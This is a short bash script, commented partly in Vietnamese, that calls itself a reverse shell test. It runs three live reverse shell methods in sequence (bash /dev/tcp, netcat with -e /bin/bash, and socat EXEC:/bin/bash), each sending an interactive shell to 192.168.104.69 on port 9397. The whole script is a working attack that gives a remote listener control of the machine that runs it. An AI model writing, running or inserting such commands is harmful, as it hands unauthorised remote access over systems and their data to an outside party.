#!/bin/bash
# Script test reverse shell

echo "Testing reverse shell connection..."

# Cách 1: Sử dụng bash
echo "Method 1: bash -i >& /dev/tcp/192.168.104.69/9397 0>&1"
bash -i >& /dev/tcp/192.168.104.69/9397 0>&1

# Cách 2: Sử dụng nc (nếu có)
echo "Method 2: nc -e /bin/bash 192.168.104.69 9397"
nc -e /bin/bash 192.168.104.69 9397

# Cách 3: Sử dụng socat (nếu có)
echo "Method 3: socat TCP:192.168.104.69:9397 EXEC:/bin/bash"
socat TCP:192.168.104.69:9397 EXEC:/bin/bash

echo "All methods tested" 